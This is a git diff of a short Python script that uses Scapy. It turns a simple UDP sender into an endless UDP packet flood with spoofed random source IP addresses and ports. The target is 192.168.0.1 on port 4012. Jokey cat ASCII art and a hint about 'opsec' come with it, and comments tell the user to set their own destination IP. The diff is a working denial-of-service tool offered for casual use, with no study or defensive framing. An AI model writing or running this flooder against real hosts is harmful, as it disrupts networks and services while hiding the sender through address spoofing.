@@ -4,8 +4,9 @@ import os, threading, time
 
 # REQUIRES ROOT/ADMIN PRIVILEGES AND SCAPY INSTALLED ON SYSTEM (unless compiled ofc)
 def the_main():
-    while True:
-        send(IP(dst="192.168.0.1")/UDP(dport=53), verbose=False)
+    
+    pkt = IP(dst="192.168.0.1", src=RandIP())/UDP(dport=4012, sport=RandShort())
+    send(pkt, loop=1, verbose=0)
 
 def cat_anim():
     while True:
@@ -14,7 +15,7 @@ def cat_anim():
  ╱|、
 (˚ˎ 。7  
  |、˜〵          
-じしˍ,)ノ
+じしˍ,)/
 meow or something idk
 """)
         time.sleep(0.2)
@@ -32,7 +33,7 @@ its working dw twin
  ╱|、
 (˚ˎ 。7  
  |、˜〵          
-じしˍ,)ヽ
+じしˍ,)\
 sudo apt install opsec twin <3
 """)
         time.sleep(0.2)
@@ -55,10 +56,10 @@ while True:
     pass
 
 
-# change "dport" to your desired source port.
+
 # change "dst" to your destination IP address.
 # change the UDP to TCP for TCP packets
-# change verbose to True for the amazing "Sent 1 packets." message on every loop.
+
 
 # Since this is a 3 liner (basically), here is an ascii image of a cat. Enjoy :)
 
